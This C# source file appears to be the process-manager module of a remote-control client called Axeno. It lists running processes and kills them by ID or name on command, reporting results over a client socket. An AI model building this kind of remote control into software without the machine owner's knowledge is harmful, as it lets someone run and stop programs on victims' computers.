using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Client.Networking.Functions.System
{
    internal class ProcessManager
    {
        public static byte[] RetrieveProcesses()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    string company = "/";
                    string description = "/";
                    try
                    {
                        var fileVersionInfo = FileVersionInfo.GetVersionInfo(process.MainModule.FileName);
                        company = fileVersionInfo.CompanyName;
                        description = fileVersionInfo.FileDescription;
                    }
                    catch
                    {

                    }
                    double privateBytesMiB = Math.Round(process.PrivateMemorySize64 / Math.Pow(1024, 2), 2);
                    double workingSetMiB = Math.Round(process.WorkingSet64 / Math.Pow(1024, 2), 2);

                    sb.Append($"Process({process.ProcessName})StartTime({process.StartTime})PrivateBytes({privateBytesMiB.ToString()} MiB)WorkingSet({workingSetMiB.ToString()} MiB)ProcessID({process.Id})Company({company})Description({description})(SPLITHERE)");

                }
                catch (Exception)
                {

                }
            }
            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "ProcessList";
            mpack.ForcePathObject("Processes").AsString = sb.ToString();
            return mpack.Encode2Bytes();
        }
        public static void KillProcess(int id)
        {
            string result = "Failure";
            try
            {
                Process proc = Process.GetProcessById(id);
                proc.Kill();
                proc.Dispose();
                result = "Success";
            }
            catch { }
            MsgPack mpack = new MsgPack();

            mpack.ForcePathObject("Packet").AsString = "ProcessKilled";
            mpack.ForcePathObject("ID").AsString = id.ToString();
            mpack.ForcePathObject("Result").AsString = result;
            ClientSocket.Send(mpack.Encode2Bytes());
        }
        public static void KillProcessTree(string name)
        {
            string result = "Failure";
            try
            {
                foreach(Process proc in Process.GetProcessesByName(name))
                {
                    proc.Kill();
                    proc.Dispose();
                }
                result = "Success";
            }
            catch { }
            MsgPack mpack = new MsgPack();

            mpack.ForcePathObject("Packet").AsString = "ProcessKilled";
            mpack.ForcePathObject("Result").AsString = result;
            ClientSocket.Send(mpack.Encode2Bytes());
        }
    }
}
